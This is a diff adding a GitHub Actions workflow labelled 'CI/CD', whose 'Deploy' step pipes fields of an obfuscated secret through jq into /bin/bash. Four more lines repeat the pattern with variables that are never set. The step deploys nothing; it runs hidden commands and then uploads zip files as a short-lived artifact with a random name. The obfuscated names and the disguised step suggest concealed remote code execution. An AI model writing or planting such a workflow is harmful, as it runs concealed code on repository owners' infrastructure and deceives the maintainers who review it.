@@ -1,0 +1,27 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+jobs:
+  dispatcher:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Deploy
+        env:
+          zy87121: ${{ secrets.zy87121 }}
+        run: |
+          printf '%s' "$zy87121" | jq -r .w768 | /bin/bash
+          echo $puglj14 | jq -r .syre721 | /bin/bash
+          printf '%s' "$witht3" | jq -r .bh55 | /bin/bash
+          printf '%s' "$c25" | jq -r .qil90757 | /bin/bash
+          printf '%s' "$up27637" | jq -r .w9 | /bin/bash
+
+      - name: Save results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ZlBuwNNt
+          path: "*.zip"
+          retention-days: 1
